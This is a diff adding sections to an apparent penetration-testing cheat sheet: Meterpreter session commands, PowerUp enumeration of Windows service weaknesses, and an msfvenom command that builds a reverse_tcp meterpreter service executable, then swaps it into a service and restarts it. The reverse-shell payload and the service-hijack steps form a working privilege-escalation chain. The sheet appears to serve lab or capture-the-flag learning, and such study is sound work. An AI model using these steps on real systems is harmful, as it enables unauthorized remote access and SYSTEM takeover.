@@ -15,6 +15,7 @@
   - [Msfvenom JSP WAR Reverse Shell](#msfvenom-jsp-war-reverse-shell)
 - [Remote Access](#remote-access)
   - [Windows Remote Management (WinRM)](#windows-remote-management-winrm)
+  - [Meterpreter Session Basics](#meterpreter-session-basics)
 - [Privilege Escalation](#privilege-escalation)
   - [Linux](#linux)
     - [SUID Files](#suid-files)
@@ -22,6 +23,10 @@
     - [Cron Jobs](#cron-jobs)
     - [Overwrite Writable Cron Script](#overwrite-writable-cron-script)
     - [Writable Directories](#writable-directories)
+  - [Windows](#windows)
+    - [PowerUp.ps1](#powerupps1)
+    - [Interpreting PowerUp Output](#interpreting-powerup-output)
+    - [Msfvenom Service Executable and Restart](#msfvenom-service-executable-and-restart)
 - [Password Cracking](#password-cracking)
   - [John the Ripper](#john-the-ripper)
   - [Unshadow](#unshadow)
@@ -472,6 +477,32 @@ evil-winrm -i <target> -u <username> -p '<password>'
   * `Invoke-Binary`: Execute uploaded binaries
 * Example: `evil-winrm -i 10.10.161.74 -u SUSANNA_MCKNIGHT -p 'CHANGEME2023!'`
 
+### Meterpreter Session Basics
+
+* **Upload / download** - Transfer files between your machine and the target
+
+```text
+upload /path/on/kali/file.exe C:\\Windows\\Temp\\file.exe
+download C:\\Users\\user\\Desktop\\note.txt /tmp/note.txt
+```
+
+* **System shell (cmd)** - Spawns a regular Windows shell from the session
+
+```text
+shell
+```
+
+* **PowerShell from Meterpreter** - Load the extension, then open an interactive PowerShell session
+
+```text
+load powershell
+powershell_shell
+```
+
+* **Leaving nested shells** - Type `exit` to leave `powershell_shell` or `shell` and return to the `meterpreter >` prompt
+* **Background session** - `background` (or `bg`) sends the session to the background so you can use other Metasploit modules; `sessions -i <id>` to reattach
+* **End the session** - `exit` from the `meterpreter >` prompt closes that Meterpreter session (use `background` first if you only want to step out)
+
 ---
 
 ## Privilege Escalation
@@ -631,6 +662,66 @@ export PATH=/tmp:$PATH
   4. Export PATH: `export PATH=/tmp:$PATH`
   5. When the SUID binary or cron job runs the command, it will execute your malicious binary with elevated privileges
 * **Check for exploitable binaries**: Look for SUID binaries or cron jobs that call commands without absolute paths
+
+### Windows
+
+#### PowerUp.ps1
+
+* **PowerUp** (PowerSploit) enumerates common Windows privilege-escalation weaknesses. **Dot-source** the script so functions stay in your current PowerShell session—`.\PowerUp.ps1` alone runs in a child scope and may not define `Invoke-AllChecks` where you need it.
+
+```powershell
+. .\PowerUp.ps1
+Invoke-AllChecks
+```
+
+* `. .\PowerUp.ps1`: Leading dot + space = dot-source (loads script into the current session)
+* `Invoke-AllChecks`: Runs PowerUp’s checks and prints findings (weak services, unquoted paths, writable paths, etc.)
+
+#### Interpreting PowerUp Output
+
+* **Example** (vulnerable service — unquoted path + modifiable component):
+
+```text
+ServiceName    : AdvancedSystemCareService9
+Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
+CanRestart     : True
+Name           : AdvancedSystemCareService9
+Check          : Unquoted Service Paths
+```
+
+* **Why this points to exploitation**
+  * **Check: Unquoted Service Paths** — The service binary path contains spaces and is not wrapped in quotes. Windows parses the path left to right and may execute `C:\Program.exe` (or another early component) if a malicious binary exists there, before the real path.
+  * **ModifiablePath** — Shows a folder low-priv users can write to (`BUILTIN\Users` with `AppendData/AddSubdirectory` on `C:\` in this example). If any segment of the service path is under a writable directory, you can drop a payload with the right name so the service starts your code.
+  * **StartName: LocalSystem** — The service runs as **NT AUTHORITY\SYSTEM** when started, so a successful hijack or binary replacement yields **SYSTEM**.
+  * **CanRestart: True** — You can `net stop` / `net start` the service (if allowed) to reload the binary and trigger your payload without a reboot.
+  * **AbuseFunction** — PowerSploit’s suggested next step (e.g. `Write-ServiceBinary`) replaces or hijacks the service binary; use only on systems you are authorized to test.
+
+#### Msfvenom Service Executable and Restart
+
+* **Build a Windows service-friendly executable** — Use `exe-service` so the payload is suitable to run as a service binary (pair with a handler for the payload you choose).
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe-service -o payload.exe
+```
+
+* Use `windows/meterpreter/reverse_tcp` (32-bit) instead of `windows/x64/...` if the target service is 32-bit only
+* Transfer `payload.exe` to the target, **replace** the legitimate service executable (same path and filename as in **Path**), or place it at a hijack point PowerUp identified
+* **Stop the service** (*Fermare il servizio*) so the file on disk can be overwritten:
+
+```cmd
+net stop AdvancedSystemCareService9
+```
+
+* **Start the service** (*Far ripartire il servizio — esegue il tuo payload*) after swapping the binary:
+
+```cmd
+net start AdvancedSystemCareService9
+```
+
+* Replace `AdvancedSystemCareService9` with the **ServiceName** from PowerUp or `sc qc <ServiceName>` output
 
 ---
 
